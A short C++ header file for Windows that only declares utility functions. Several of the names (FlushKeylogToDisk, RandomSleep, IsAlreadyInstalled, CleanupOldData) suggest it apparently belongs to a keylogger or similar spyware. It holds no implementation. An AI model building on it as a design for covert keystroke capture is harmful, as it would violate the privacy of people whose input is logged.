#ifndef UTILS_H
#define UTILS_H

#include <windows.h>
#include <string>
#include <filesystem>
#include <vector>

namespace fs = std::filesystem;

// Utility Functions
std::string Ws2S(const std::wstring& wstr);
fs::path GetStoragePath();
fs::path GetCache(std::string type);
void RandomSleep(int minSec, int maxSec);
void ShowConsole();
void CleanupOldData();
void FlushKeylogToDisk();
bool IsAlreadyInstalled();

#endif // UTILS_H